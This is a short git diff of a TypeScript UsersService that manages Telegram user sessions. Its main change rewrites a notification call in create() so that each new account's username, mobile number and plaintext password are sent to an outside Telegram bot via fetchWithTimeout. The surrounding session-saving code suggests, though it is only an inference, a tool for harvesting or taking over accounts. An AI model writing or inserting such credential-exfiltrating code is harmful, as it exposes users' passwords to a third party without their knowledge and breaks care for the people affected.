@@ -16,7 +16,7 @@ export class UsersService {
     private telegramService: TelegramService,
     @Inject(forwardRef(() => ClientService))
     private clientsService: ClientService
-  ) { }
+  ) {}
 
   async create(user: CreateUserDto): Promise<User> {
     const activeClientSetup = this.telegramService.getActiveClientSetup();
@@ -26,7 +26,7 @@ export class UsersService {
       console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
       await this.clientsService.updateClientSession(user.session)
     } else {
-      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
+      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nmobile: ${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
       const newUser = new this.userModel(user);
       return newUser.save();
     }
